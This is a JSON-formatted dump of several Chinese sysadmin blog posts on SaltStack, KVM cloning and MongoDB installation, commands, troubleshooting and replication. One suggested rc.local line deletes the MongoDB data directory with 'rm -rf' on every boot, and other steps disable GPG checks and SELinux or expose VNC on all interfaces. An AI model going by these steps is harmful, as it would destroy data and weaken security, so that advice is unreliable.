原来是进程挂了，所有这也是salt什么都好唯一一点缺点就是需要配置客户端启动服务，这样对网络传输等等都有要求比较高。一旦进程死了，几百台以上可能就比较费力。 1234- salt 'shell正则' 命令- salt -E 'prel 正则'- salt -N $group 命令- salt -L 'server_id1,server_id2,server_id3' 命令 123456常用的操作类似如下- salt '*' cmd.run \"ab -n 10 -c 2 http://www.google.com/\"- salt '*' grains.ls 查看grains分类- salt '*' grains.items 查看grains所有信息- salt '*' grains.item osrelease 查看grains某个信息- salt '*' cmd.run \"/App/nginx/sbin/nginx -v\"","raw":null,"content":null,"categories":[{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/categories/Automation/"}],"tags":[{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/tags/Automation/"},{"name":"Saltstack","slug":"Saltstack","permalink":"http://blog.yangcvo.me/tags/Saltstack/"}]},{"title":"KVM虚拟机如何进行克隆操作","slug":"容器-虚拟化/kvm/KVM虚拟机如何进行克隆操作","date":"2015-09-29T10:32:16.000Z","updated":"2017-03-14T05:46:59.000Z","comments":true,"path":"2015/09/29/容器-虚拟化/kvm/KVM虚拟机如何进行克隆操作/","link":"","permalink":"http://blog.yangcvo.me/2015/09/29/容器-虚拟化/kvm/KVM虚拟机如何进行克隆操作/","excerpt":"","text":"KVM虚拟机如何进行克隆操作我们知道，重复的事情做多了就需要上脚本或采用工具以便节省操作时间，提升工作效率，减低繁琐操作。本人也是懒人一个，相同的事情做多了，就想法子弄成脚本或采用工具去搞。KVM虚拟机的创建同样如此，我们不可能每次创建都要手工执行一次，于是就有了KVM克隆出现。克隆操作有两种方式： (1) KVM本机虚拟机直接克隆。(2) 通过复制配置文件与磁盘文件的虚拟机复制克隆(适用于异机的静态迁移)。 一. KVM本机虚拟机直接克隆。 克隆主机。以我们之前创建的samba为例,克隆完毕以后直接启动该主机并进行配置。 1234567891011121314151617[root@kvm vm]# virsh list --all Id 名称 状态---------------------------------------------------- - namenode 关闭 - samba 关闭 - tomcat_F1 关闭 [root@21yunwei autostart]# virt-clone --original samba --name tomcat_F1 --file /opt/vm/tomcat_F1.img Cloning tomcat_F1.img | 25.0 GB 01:39 Clone 'tomcat_F1' created successfully.[root@kvm vm]# virsh list --all Id Name State---------------------------------------------------- - namenode 关闭 - samba 关闭 - tomcat_F1 关闭 克隆完成以后服务是没有启动的，这会我们把服务启动： 12[root@kvm qemu]# virsh start tomcat_F1域 tomcat_F1 已开始 注意：（1）上述命令可以简化成 virt-clone -o samba -n tomcat_F1 -f/opt/vm/tomcat_F1.img （2）操作之前，请先将拷贝的对象机关闭或暂停，否则会报错。（3）建议将之前做好的第一个主机设置成模板，这样以后每次创建主机以后用vnc进去修改网络参数配置就行了。 这里提示下 这里克隆的时候默认是随机VNC端口的，所有这里需要你克隆完成以后自己设置下端口，不然不知道端口是多少。 vim /etc/libvirt/qemu/tomcat_F1.xml 12345678910111213141516 &lt;address type='usb' bus='0' port='1'/&gt; &lt;/input&gt; &lt;input type='mouse' bus='ps2'/&gt; &lt;input type='keyboard' bus='ps2'/&gt; &lt;graphics type='vnc' port='5921' autoport='no' listen='0.0.0.0'&gt; &lt;listen type='address' address='0.0.0.0'/&gt; ##vnc prot=远程端口 autoport='no' 设置no &lt;/graphics&gt; &lt;video&gt; &lt;model type='cirrus' vram='16384' heads='1' primary='yes'/&gt; &lt;address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x0'/&gt; &lt;/video&gt; &lt;memballoon model='virtio'&gt; &lt;address type='pci' domain='0x0000' bus='0x00' slot='0x07' function='0x0'/&gt; &lt;/memballoon&gt; &lt;/devices&gt;&lt;/domain&gt; vnc登录进去修改网卡参数和配置 （1）ifconfig -a 查看网卡情况。注意mac地址等影响网卡因素。可以编辑网卡改成ifconfig -a网卡信息或/etc/udev/rule.d/70-persistent-net.rules里边的信息与要设置的网卡匹配就可以了。（2）或者删除/etc/udev/rule.d/70-persistent-net.rules文件，这个重启系统会自动生成的。修改下IP地址：vim /etc/sysconfig/network-scripts/ifctg-eth0修改自己要的IP，完以后tomcat_F1 也可以上网了。如下图所示： 二 通过复制配置文件与磁盘文件的虚拟机复制克隆(适用于异机的静态迁移)这个操作对大多数用户用不到，平时我们的测试环境也用不到这么专业。有兴趣的朋友可以自行参考KVM静态迁移 ，这里不做操作展示了。 本文KVM克隆操作得以顺利实现，主要操作参考了如下资料，这里做下资料参考以便后边的朋友可以自行查看。阿铭KVM克隆：https://www.apelearn.com/bbs/thread-8299-1-1.htmlkoumm的BLOG：http://koumm.blog.51cto.com/703525/1291793","raw":null,"content":null,"categories":[{"name":"虚拟化","slug":"虚拟化","permalink":"http://blog.yangcvo.me/categories/虚拟化/"}],"tags":[{"name":"Virtualization-Docker","slug":"Virtualization-Docker","permalink":"http://blog.yangcvo.me/tags/Virtualization-Docker/"},{"name":"KVM","slug":"KVM","permalink":"http://blog.yangcvo.me/tags/KVM/"}]},{"title":"RedHat企业版或CentOS的Linux上yum方式安装MongoDB","slug":"数据库/Mongodb/Red Hat企业版或CentOS的Linux上安装MongoDB","date":"2015-09-22T06:47:27.000Z","updated":"2017-05-04T16:09:50.000Z","comments":true,"path":"2015/09/22/数据库/Mongodb/Red Hat企业版或CentOS的Linux上安装MongoDB/","link":"","permalink":"http://blog.yangcvo.me/2015/09/22/数据库/Mongodb/Red Hat企业版或CentOS的Linux上安装MongoDB/","excerpt":"","text":"##RedHat企业版或CentOS的Linux上yum方式安装MongoDB 概述 官网翻译： 使用本教程对使用Red Hat Enterprise Linux或CentOS的Linux版本5，6，7安装MongoDB中的.rpm软件包。虽然这些发行版包括自己的MongoDB包，官方MongoDB的包装一般都比较最新的。 平台支持 本安装指南只支持64位系统。请参阅平台支持的详细信息。 安装包 MongoDB中提供正式在自己的资源库支持的包。这个库包含以下包： MongoDB-org这个包是一个元数据包，它会自动安装以下四个组件包。 MongoDB-org-server该软件包包含的mongod守护进程和相关的配置和初始化脚本。 MongoDB-ORG-mongos这个软件包包含了mongos后台程序。 MongoDB-org-shell这个软件包包含了 mongo shell.。 MongoDB-ORG-工具这个软件包包含以下的MongoDB 和mongotop。 ####初始化脚本 在MongoDB中，组织包包括各种初始化脚本，包括初始化脚本/etc/rc.d/init.d/mongod。这些脚本用来停止，启动和重新启动守护进程。 下载：mongodb.sh下载：mongodb.init 使用MongoDB的包配置/etc/mongod.conf文件中的初始化脚本结合。查看配置文件 进行的配置文件中的可用设置文档的参考。 随着3.2.0版本，没有初始化脚本 mongos。该mongos过程只用于 分片。您可以使用mongod的初始化脚本派生自己的mongos初始化脚本在这样的环境中使用。见mongos详细的配置信息参考。 ####注意事项 本安装指南只支持64位系统。请参阅平台支持的详细信息。 默认/etc/mongod.conf由3.0系列包提供的配置文件中有bind_ip设置为 127.0.0.1默认。根据需要为您的环境初始化之前修改此设置副本集。 改变在2.6版本：包的结构和名称已更改为2.6版本。有关安装旧版本的说明，请参阅文件，将正确的版本。 安装MongoDB的 ####配置包管理系统 创建/etc/yum.repos.d/mongodb-org-3.2.repo文件，这样就可以直接安装MongoDB的，使用百胜。 改变版本3.0：MongoDB 的Linux软件包是一个新的存储库3.0开始。 对于最新的MongoDB的稳定版本 使用下面的库文件： 12345[mongodb-org-3.2]name=MongoDB Repositorybaseurl=https://repo.mongodb.org/yum/redhat/$releasever/mongodb-org/3.2/x86_64/gpgcheck=0enabled=1 ####对于MongoDB的版本更早于 从较早安装的软件包 release series，如2.4或2.6，您可以指定发布系列存储库中的配置。例如，你的系统限制在2.6版本系列，创建 /etc/yum.repos.d/mongodb-org-2.6.repo文件保存为MongoDB的2.6存储库中的以下配置信息： 123456[mongodb-org-2.6]name=MongoDB 2.6 Repositorybaseurl=http://downloads-distro.mongodb.org/repo/redhat/os/x86_64/gpgcheck=0enabled=1 你可以找到的.repo文件，每个版本 in the repository itself.。请记住，奇数次要发行版本（如2.5）的开发版本，而且不适合生产使用。 ####安装MongoDB的包和相关的工具 当您安装的软件包，您可以选择是否安装当前版本或前一个。此步骤提供的命令为两者。 要安装的MongoDB的最新稳定版本，发出以下命令： 1sudo yum install -y mongodb-org 要安装MongoDB中的一个特定版本，分别指定每个组件包并追加版本号的包名，如下面的例子： 1sudo yum install -y mongodb-org-3.2.0 mongodb-org-server-3.2.0 mongodb-org-shell-3.2.0 mongodb-org-mongos-3.2.0 mongodb-org-tools-3.2.0 您可以指定MongoDB中的任何版本。但是百胜 将升级包，当一个新的版本可用。为了防止意外升级，引脚封装。若要固定一个包，下面的添加排除指令到你的/etc/yum.conf中的文件 1exclude=mongodb-org,mongodb-org-server,mongodb-org-shell,mongodb-org-mongos,mongodb-org-tools MongoDB的包2.6之前的版本中使用不同的回购位置。请参考相应的文档，为您的MongoDB版本的版本。 禁用SELinux完全改变SELINUX设置 disabled在的/etc/ SELinux/config中。 SELINUX =disabled SELinux的设置要宽容模式的/ etc / SELinux的/ config中通过改变SELINUX设置permissive。 SELINUX =permissive 注意您可以使用setenforce切换到许可模式; 这种方法并不需要重新启动，但是不持久的。 允许访问SELinux的相关端口（如27017），如果在 执行模式。请参见默认端口的MongoDB对MongoDB的默认端口的详细信息。为默认设置，这可以通过运行来实现 semanage port -a -t mongod_port_t -p tcp 27017 警告在RHEL 7.0，如果你改变了数据路径，在默认的SELinux策略将阻止的mongod从具有新的数据路径上的写权限，如果你不更改安全上下文。 您可以替代选择不安装，当您安装Linux操作系统SELinux的套餐，或选择删除相关的包。此选项是最激进的，不建议。 数据目录和权限 警告 在RHEL 7.0，如果你改变了数据路径，在默认的SELinux策略将阻止的mongod从具有新的数据路径上的写权限，如果你不更改安全上下文。 在MongoDB实例存储在其数据文件/var/lib/mongo ，并在其日志文件/var/log/mongodb默认情况下，并运行使用mongod的 用户帐户。您可以在指定替代的日志和数据文件目录/etc/mongod.conf。见systemLog.path 和storage.dbPath了解更多信息。 如果您更改运行的MongoDB进程的用户，您 必须修改访问控制权限的/var/lib/mongo和 /var/log/mongodb目录，给这些目录此用户访问。 ###启动MongoDB的 您可以启动的mongod通过发出以下命令的过程： 1sudo service mongod start 验证的MongoDB已成功启动 您可以验证的mongod通过检查日志文件的内容在过程中已成功启动/var/log/mongodb/mongod.log 的行读取 [initandlisten] waiting for connections on port 其时 是configured in/etc/mongod.conf，27017默认情况下。 您可以选择保证的MongoDB将启动下重新启动系统通过发出以下命令： 1sudo chkconfig mongod on ####停止MongoDB的 根据需要，你可以停止的mongod通过发出以下命令的过程： 1sudo service mongod stop ####重新启动MongoDB的 您可以重新启动的mongod通过发出以下命令的过程： 1sudo service mongod restart 您可以通过观看在输出遵循过程中的错误或重要信息的状态/var/log/mongodb/mongod.log文件。 ##开始使用MongoDB的 为了帮助您开始使用MongoDB的，MongoDB中提供了入门指南中的各种驱动程序的版本。见 入门的可用版本。 之前，在生产环境中部署的MongoDB，考虑 Production Notes文档。 后来，停止MongoDB中，按Control+C在该终端 的mongod实例运行。 ##卸载的 从系统中完全删除MongoDB中，您必须删除MongoDB的应用程序本身，配置文件，以及包含数据和日志的任何目录。以下部分将引导您完成必要的步骤。 ##警告 这个过程将完全删除MongoDB中，它的配置和所有的 数据库。这个过程是不可逆的，因此请确保您所有的配置和数据进行备份，然后再继续。 ####停止MongoDB的 停止的mongod通过发出以下命令的过程： 1sudo service mongod stop ####删除软件包 删除您以前安装的任何MongoDB的软件包。 1sudo yum erase $(rpm -qa | grep mongodb-org) ####删除数据目录 删除的MongoDB数据库和日志文件。 12sudo rm -r /var/log/mongodbsudo rm -r /var/lib/mongo 参考官方文档","raw":null,"content":null,"categories":[],"tags":[]},{"title":"Mongodb基本命令操作","slug":"数据库/Mongodb/Mongodb基本操作","date":"2015-09-22T06:47:27.000Z","updated":"2017-05-04T16:10:13.000Z","comments":true,"path":"2015/09/22/数据库/Mongodb/Mongodb基本操作/","link":"","permalink":"http://blog.yangcvo.me/2015/09/22/数据库/Mongodb/Mongodb基本操作/","excerpt":"","text":"Mongodb基本命令操作###MongoDB数据库基本用法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869show dbs:显示数据库列表show collections：显示当前数据库中的集合（类似关系数据库中的表）show users：显示用户use &lt;db name&gt;：切换当前数据库，这和MS-SQL里面的意思一样db.help()：显示数据库操作命令，里面有很多的命令db.foo.help()：显示集合操作命令，同样有很多的命令，foo指的是当前数据库下，一个叫foo的集合，并非真正意义上的命令db.foo.find()：对于当前数据库中的foo集合进行数据查找（由于没有条件，会列出所有数据）db.foo.find( &#123; a : 1 &#125; )：对于当前数据库中的foo集合进行查找，条件是数据中有一个属性叫a，且a的值为1MongoDB没有创建数据库的命令，但有类似的命令。如：如果你想创建一个“myTest”的数据库，先运行use myTest命令，之后就做一些操作（如：db.createCollection('user')）,这样就可以创建一个名叫“myTest”的数据库。数据库常用命令1、Help查看命令提示 help db.help(); db.yourColl.help(); db.youColl.find().help(); rs.help();2、切换/创建数据库 use yourDB; 当创建一个集合(table)的时候会自动创建当前数据库3、查询所有数据库 show dbs;4、删除当前使用数据库 db.dropDatabase();5、从指定主机上克隆数据库 db.cloneDatabase(“127.0.0.1”); 将指定机器上的数据库的数据克隆到当前数据库6、从指定的机器上复制指定数据库数据到某个数据库 db.copyDatabase(\"mydb\", \"temp\", \"127.0.0.1\");将本机的mydb的数据复制到temp数据库中7、修复当前数据库 db.repairDatabase();8、查看当前使用的数据库 db.getName(); db; db和getName方法是一样的效果，都可以查询当前使用的数据库9、显示当前db状态 db.stats();10、当前db版本 db.version();11、查看当前db的链接机器地址 db.getMongo();Collection聚集集合1、创建一个聚集集合（table） db.createCollection(“collName”, &#123;size: 20, capped: 5, max: 100&#125;);2、得到指定名称的聚集集合（table） db.getCollection(\"account\");3、得到当前db的所有聚集集合 db.getCollectionNames();4、显示当前db所有聚集索引的状态 db.printCollectionStats();用户相关1、添加一个用户 db.addUser(\"name\"); db.addUser(\"userName\", \"pwd123\", true); 添加用户、设置密码、是否只读2、数据库认证、安全模式 db.auth(\"userName\", \"123123\");3、显示当前所有用户 show users;4、删除用户 db.removeUser(\"userName\");其他1、查询之前的错误信息 db.getPrevError();2、清除错误记录 db.resetError(); ###shell操作数据库： 超级用户相关： 1234567891011121314151617181920212223242526272829303132 1. #进入数据库admin use admin 2. #增加或修改用户密码 db.addUser('name','pwd') 3. #查看用户列表 db.system.users.find() 4. #用户认证 db.auth('name','pwd') 5. #删除用户 db.removeUser('name') 6. #查看所有用户 show users 7. #查看所有数据库 show dbs 8. #查看所有的collection show collections 9. #查看各collection的状态 db.printCollectionStats()10. #查看主从复制状态 db.printReplicationInfo()11. #修复数据库 db.repairDatabase()12. #设置记录profiling，0=off 1=slow 2=all db.setProfilingLevel(1)13. #查看profiling show profile14. #拷贝数据库 db.copyDatabase('mail_addr','mail_addr_tmp')15. #删除collection db.mail_addr.drop()16. #删除当前的数据库 db.dropDatabase() ###1. Mongodb的开启 默认启动：./mongodb默认数据保存路径：/data/db/默认端口：27017 修改默认路径： 12 --dbpath# ./mongdb --dbpath /mongodb/ 把数据存储位置指向一个自己的目录/mongodb/ 修改默认端口： 12--port$ ./mongdb --port 20111 把服务端口修改为20111，这个一方面是为了安全，使用默认端口容易被一些恶意的人发现做手脚. 启动后台服务: 1--fork 在后台开启Mongdb服务在使用这个方式启动的时候要注意两点： 121、该功能只在1.1之后的版本才可以使用。2、另外通过这个方式在后台启动，如果在启动的时候像--dbpath 那样使用 --logpath 输出日志时候日志输出目录也要自己创建。 如： 1# ./mongod --fork --logpath /var/log/mongodb.log --logappend 解析最后–logappend,以追加的方式创建日志防止把之前的日志删除了 ####2.Mongodb的关闭: 前台运行: 如果没有使用–fork，直接可以前台退出终端关闭。通过这种方式，Mongodb将会自己做清理退出，把没有写好的数据写完成，并最终关闭数据文件。要注意的是这个过程会持续到所有操作都完成。 后台运行: 如果使用–fork在后台运行mongdb服务，那么就要通过向服务器发送shutdownServer()消息来关闭。 1、普通命令： 123# ./mongod&gt; use admin&gt; db.shutdownServer() 要注意的是，这个命令只允许在本地，或是一个经过认证的客户端。 2、如果这是一个主从式的复制集群，在1.9.1版本后将按下面的步骤来关闭 123- 检查从Mongodb的数据更新时间- 如果所有的从Mongodb和主的时间差都超过10，这个时候不会关闭mongodb（在这种情况下面，我们可以通过配置timeoutSecs的方式来让从Mongodb完成数据的更新）- 如果其中有一个从Mongodb与主服务时间差在10秒内，那么主服务器将会关闭，并且等待从Mongodb更新完成并关闭。 3、如果没有up-to-date 从Mongodb且你想强制关闭服务，可以通过添加force:true;命令如下： 123&gt; db.adminCommand(&#123;shutdown : 1, force : true&#125;)&gt; //or&gt; db.shutdownServer(&#123;force : true&#125;) 4、指定特定超时时间的关闭服务器，命令同上，另外加上一个timeoutsec:参数 123&gt; db.adminCommand(shutdown : 1, force : true, timeoutsec : 5)&gt; //or&gt; db.shutdownServer(&#123;force : true, timeoutsec : 5&#125;) Mongodb开机启动 在/etc/rc.d/rc.local文件末尾添加下面的代码 ####add mongodb service 1rm -rf /data/mongodb_data/* &amp;&amp; /usr/local/mongodb/bin/mongod --dbpath=/data/mongdb_data/ --logpath=/data/mongdb_log/mongodb.log --logappend &amp;","raw":null,"content":null,"categories":[],"tags":[]},{"title":"Mongodb启动的解决方法","slug":"数据库/Mongodb/Mongodb启动的解决方法","date":"2015-09-21T06:47:27.000Z","updated":"2017-05-04T16:09:27.000Z","comments":true,"path":"2015/09/21/数据库/Mongodb/Mongodb启动的解决方法/","link":"","permalink":"http://blog.yangcvo.me/2015/09/21/数据库/Mongodb/Mongodb启动的解决方法/","excerpt":"","text":"#Mongodb启动的解决方法 ####无法启动分析： 遇到MongoDB突然无法启动，第一反应是删除mongod.lock。这个文件在MongoDB的数据库目录下，默认是/data/db。这是最常见的问题了，产生原因是MongoDB没有正常结束（比如被kill -9杀掉或是其他意外情况导致中断）。 还一些其他情况会导致MongoDB无法启动。本文讨论的无法启动，是指：使用/etc/init.d/mongodb start或是sudo service mongdb start，提示mongodb start/running，但查看status仍然是stop/waiting。 service SERVERNAME status有可能误报，先确认MongoDB的实际状态。主要是ps axu|grep mongod查看是否有相关进程，打开links或是直接用浏览器访问127.0.0.1:28017，看不到MongoDB的信息说明没有启动。 查看日志是否提前权限不足。 ####然后执行： 12$ sudo mongod –repair –config /etc/mongodb.conf$ sudo mongod –config /etc/mongodb.conf 第一条命令是修复操作，第二条命令是手动指定MongoDB的配置文件，在终端中直接运行，这样输出错误时比较直观，不用去翻日志。如果能顺利运行mongod，说明配置文件和数据库都没有问题，是/usr/bin/mongodb权限不够，请参考本文结尾setcap方法。 如果不能运行，可以看到报错信息，分三种情况：配置文件错误，数据目录设置错误，/usr/bin/mongod文件错误。 配置文件错误比较明显，参数错误会明确提示error command line: unknown option xxx。第二条命令中明确指定使用的配置文件，也容易排错。所以除了之前配MongoDB主从修改配置文件弄坏过一次，很少遇到配置文件的问题。 其次是数据目录，主要是权限问题，可能的报错是： 123Thu 22 11 10:03:30 [initandlisten] warning couldn’t write to / rename file /srv/mongodb/journal/prealloc.0Thu 22 11 10:03:30 [initandlisten] couldn’t open /srv/mongodb/duoshuo.ns errno:1 Operation not permittedThu 22 11 10:03:30 [initandlisten] error couldn’t open file /srv/mongodb/duoshuo.ns terminating 数据目录的owner应该是mongodb:mongodb。 1$ sudo chown mongodb:mongodb mongodb 最后一种情况是/usr/bin/mongod的问题。它的报错和目录没有读写权限一样，但即使你把MongoDB的数据库目录设置成777，一样会有问题。因为mongod是以O_NOATIME标志来访问文件系统的，mongodb没有这个权限，用setcap设置： 1# setcap cap_fowner+ep /usr/bin/mongod","raw":null,"content":null,"categories":[],"tags":[]},{"title":"Centos安装MongoDB数据库、配置、主从同步、备份与恢复","slug":"数据库/Mongodb/centos安装MongoDB数据库、配置、主从同步、备份与恢复","date":"2015-09-19T06:47:27.000Z","updated":"2017-05-04T16:10:38.000Z","comments":true,"path":"2015/09/19/数据库/Mongodb/centos安装MongoDB数据库、配置、主从同步、备份与恢复/","link":"","permalink":"http://blog.yangcvo.me/2015/09/19/数据库/Mongodb/centos安装MongoDB数据库、配置、主从同步、备份与恢复/","excerpt":"","text":"Centos安装MongoDB数据库、配置、主从同步、备份与恢复mongodb个人的理解 Mongo是一个高性能，开源，文档型数据库，MongoDB服务端可运行在Linux、Windows或OS X平台，支持32位和64位应用，默认端口为27017。推荐运行在64位平台，因为MongoDB在32位模式运行时支持的最大文件尺寸为2GB。 MongoDB把数据存储在文件中（默认路径为：/data/db），为提高效率使用内存映射文件进行管理。 1.1.2 适用场景 a)适合实时的插入，更新与查询，并具备应用程序实时数据存储所需的复制及高度伸缩性。b)适合作为信息基础设施的持久化缓存层。c)适合由数十或数百台服务器组成的数据库。因为Mongo已经包含对MapReduce引擎的内置支持。d)Mongo的BSON数据格式非常适合文档化格式的存储及查询。 1.1.3 不适用场景 a)高度事务性的系统。b)传统的商业智能应用。c)级为复杂的SQL查询。 ###Linux安装 源码包官网下载地址：https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-amazon-3.2.9.tgz 这里我下载了mongodb 执行下面命令，下载压缩包 1wget http://oak0aohum.bkt.clouddn.com/mongodb-linux-x86_64-rhel62-3.2.0.tgz 解压 执行下面命令解压下载好的文件 1tar -zxvf mongodb-linux-x86_64-rhel62-3.2.0.tgz 将解压后的目录复制到要运行mongodb的目录 执行下面命令mv mongodb 123456789101112131415161718[root@mongodb opt]# tar -zxvf mongodb-linux-x86_64-rhel62-3.2.0.tgzmongodb-linux-x86_64-rhel62-3.2.0/READMEmongodb-linux-x86_64-rhel62-3.2.0/THIRD-PARTY-NOTICESmongodb-linux-x86_64-rhel62-3.2.0/MPL-2mongodb-linux-x86_64-rhel62-3.2.0/GNU-AGPL-3.0mongodb-linux-x86_64-rhel62-3.2.0/bin/mongodumpmongodb-linux-x86_64-rhel62-3.2.0/bin/mongorestoremongodb-linux-x86_64-rhel62-3.2.0/bin/mongoexportmongodb-linux-x86_64-rhel62-3.2.0/bin/mongoimportmongodb-linux-x86_64-rhel62-3.2.0/bin/mongostatmongodb-linux-x86_64-rhel62-3.2.0/bin/mongotopmongodb-linux-x86_64-rhel62-3.2.0/bin/bsondumpmongodb-linux-x86_64-rhel62-3.2.0/bin/mongofilesmongodb-linux-x86_64-rhel62-3.2.0/bin/mongooplogmongodb-linux-x86_64-rhel62-3.2.0/bin/mongoperfmongodb-linux-x86_64-rhel62-3.2.0/bin/mongodmongodb-linux-x86_64-rhel62-3.2.0/bin/mongosmongodb-linux-x86_64-rhel62-3.2.0/bin/mongo 12mkdir -p /opt/mongodbmv mongodb-linux-x86_64-rhel62-3.2.0 mongodb 1.创建mongodb用户 12useradd -s /sbin/nologin mongodbchown -R mongodb:mongodb /opt/mongodb 确保可执行文件的在PATH变量中 可以在/etc/profile.d/中添加PATH=/opt/mongodb/bin:$PATH，也可以在/usr/local/bin中创建符号链接。 12vim /etc/profile.d/mongodb.shPATH=/opt/mongodb/bin:$PATH 其它 几个主流的Linux操作系统，可以分别通过它们的包管理工具安装mongodb:Red Hat 创建数据库文件目录，默认为/data/db,我把数据库文件目录放在当前文件夹下，mkdir -p data/mongodb,创建日志目录mkdir /var/log/mongodb/ 也可以设置自定义。 2.启动服务 12cd /opt/./mongodb/bin/mongod -dbpath=/data/mongodb -logpath=/var/log/mongodb.log &amp; 3.查看启动日志 123456789101112131415161718192021222324252627[root@mysql mongodb]# tailf -100 /var/log/mongodb.log2016-08-25T17:03:59.319+0800 I CONTROL [initandlisten] MongoDB starting : pid=21203 port=27017 dbpath=/data/mongodb 64-bit host=mysql2016-08-25T17:03:59.319+0800 I CONTROL [initandlisten] db version v3.2.02016-08-25T17:03:59.319+0800 I CONTROL [initandlisten] git version: 45d947729a0315accb6d4f15a6b06be6d9c19fe72016-08-25T17:03:59.319+0800 I CONTROL [initandlisten] OpenSSL version: OpenSSL 1.0.1e-fips 11 Feb 20132016-08-25T17:03:59.319+0800 I CONTROL [initandlisten] allocator: tcmalloc2016-08-25T17:03:59.319+0800 I CONTROL [initandlisten] modules: none2016-08-25T17:03:59.319+0800 I CONTROL [initandlisten] build environment:2016-08-25T17:03:59.319+0800 I CONTROL [initandlisten] distmod: rhel622016-08-25T17:03:59.319+0800 I CONTROL [initandlisten] distarch: x86_642016-08-25T17:03:59.319+0800 I CONTROL [initandlisten] target_arch: x86_642016-08-25T17:03:59.319+0800 I CONTROL [initandlisten] options: &#123; storage: &#123; dbPath: \"/data/mongodb\" &#125;, systemLog: &#123; destination: \"file\", path: \"/var/log/mongodb.log\" &#125; &#125;2016-08-25T17:03:59.338+0800 I - [initandlisten] Detected data files in /data/mongodb created by the 'wiredTiger' storage engine, so setting the active storage engine to 'wiredTiger'.2016-08-25T17:03:59.338+0800 I STORAGE [initandlisten] wiredtiger_open config: create,cache_size=1G,session_max=20000,eviction=(threads_max=4),config_base=false,statistics=(fast),log=(enabled=true,archive=true,path=journal,compressor=snappy),file_manager=(close_idle_time=100000),checkpoint=(wait=60,log_size=2GB),statistics_log=(wait=0),2016-08-25T17:03:59.648+0800 I CONTROL [initandlisten] ** WARNING: You are running this process as the root user, which is not recommended.2016-08-25T17:03:59.648+0800 I CONTROL [initandlisten]2016-08-25T17:03:59.648+0800 I CONTROL [initandlisten]2016-08-25T17:03:59.648+0800 I CONTROL [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/enabled is 'always'.2016-08-25T17:03:59.648+0800 I CONTROL [initandlisten] ** We suggest setting it to 'never'2016-08-25T17:03:59.648+0800 I CONTROL [initandlisten]2016-08-25T17:03:59.648+0800 I CONTROL [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/defrag is 'always'.2016-08-25T17:03:59.648+0800 I CONTROL [initandlisten] ** We suggest setting it to 'never'2016-08-25T17:03:59.648+0800 I CONTROL [initandlisten]2016-08-25T17:03:59.649+0800 I FTDC [initandlisten] Initializing full-time diagnostic data capture with directory '/data/mongodb/diagnostic.data'2016-08-25T17:03:59.649+0800 I NETWORK [HostnameCanonicalizationWorker] Starting hostname canonicalization worker2016-08-25T17:03:59.649+0800 I NETWORK [initandlisten] waiting for connections on port 270172016-08-25T17:04:00.147+0800 W NETWORK [HostnameCanonicalizationWorker] Failed to obtain address information for hostname mysql: Name or service not known 4.安装完，进行测试 123456789101112131415161718192021[root@mysql mongodb]# ./bin/mongoMongoDB shell version: 3.2.0connecting to: testWelcome to the MongoDB shell.For interactive help, type \"help\".For more comprehensive documentation, see http://docs.mongodb.org/Questions? Try the support group http://groups.google.com/group/mongodb-userServer has startup warnings:2016-08-25T17:03:59.648+0800 I CONTROL [initandlisten] ** WARNING: You are running this process as the root user, which is not recommended.2016-08-25T17:03:59.648+0800 I CONTROL [initandlisten]2016-08-25T17:03:59.648+0800 I CONTROL [initandlisten]2016-08-25T17:03:59.648+0800 I CONTROL [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/enabled is 'always'.2016-08-25T17:03:59.648+0800 I CONTROL [initandlisten] ** We suggest setting it to 'never'2016-08-25T17:03:59.648+0800 I CONTROL [initandlisten]2016-08-25T17:03:59.648+0800 I CONTROL [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/defrag is 'always'.2016-08-25T17:03:59.648+0800 I CONTROL [initandlisten] ** We suggest setting it to 'never'2016-08-25T17:03:59.648+0800 I CONTROL [initandlisten]&gt;&gt; 5.将mongoDB服务加入随机启动 1234vim /etc/rc.d/rc.local使用vi编辑器打开配置文件，并在其中加入下面一行代码/opt/mongodb/bin/mongod -dbpath=/data/mongodb --port 27017 -logpath=/var/log/mongodb.log --logappend &amp; 最后，将客户端mogo文件在/bin下软链接，方便随处执行： 1ln -s /opt/mongodb/bin/mongo /bin/mongo ###主从同步 1.建立数据库目录 123mkdir /mongodb/masterdbmkdir/mongodb/slavedb_1mkdir/mongodb/slavedb_2 2.分别启动主从服务器启动主服务器 监听10000端口 1./bin/mongod-dbpath /mongodb/masterdb/--port 10000 --master 启动两个从服务器 分别用10001 和 10002 端口 也可以使用 master master-&gt; slave 的设置 12./bin/mongod-dbpath /mongodb/slavedb_1--sourcelocalhost:10000 --slave --port 10001./bin/mongod-dbpath /mongodb/slavedb_2--sourcelocalhost:10000 --slave --port 10002 启动后 就会看到有日志 显示 从主服务器复制内容了 相关参数：./mongod --help–autoresync 当发现从服务器的数据不是最新时，开始从主服务器请求同步数据–slavedelay 同步延迟，单位：秒 3.测试主从 a、在主服务器新建数据库 12./bin/mongo--port 10001show dbs 里面只有系统数据库,同时如果做插入数据的操作 会提示 not master 12use testdbdb.blog.save(&#123;title:\"new article\"&#125;) b、在从服务器上查看同步数据 1234567891011./bin/mongo--port 10001MongoDB shell version: 1.6.0connecting to: 127.0.0.1:10001/test&gt; show dbsadminlocaltestdb&gt; use testdbswitched to db testdb&gt; db.blog.find()&#123; \"_id\": ObjectId(\"4c776ccce7af0727ce4b6234\"), \"title\": \"new article\"&#125; #此为同步过来的数据，测试成功","raw":null,"content":null,"categories":[],"tags":[]},{"title":"Windows安装配置Mongodb","slug":"数据库/Mongodb/Windows安装配置Mongodb","date":"2015-09-18T06:47:27.000Z","updated":"2017-05-04T16:11:32.000Z","comments":true,"path":"2015/09/18/数据库/Mongodb/Windows安装配置Mongodb/","link":"","permalink":"http://blog.yangcvo.me/2015/09/18/数据库/Mongodb/Windows安装配置Mongodb/","excerpt":"","text":"前言 MongoDB环境的部署很简单。已经用过的人肯定会和我有相同的想法。首先在官网上下载对应的版本（http://www.mongodb.org/downloads）,要分清是自己的是32位还是64位的。 MongoDb的版本号，偶数的版本是稳定版，奇数是开发版。例如，1.2开头的是稳定版(1.2.0 , 1.2.1 , 1.2.2 等等) ，1.3开头的开发版（1.3.0 , 1.3.1 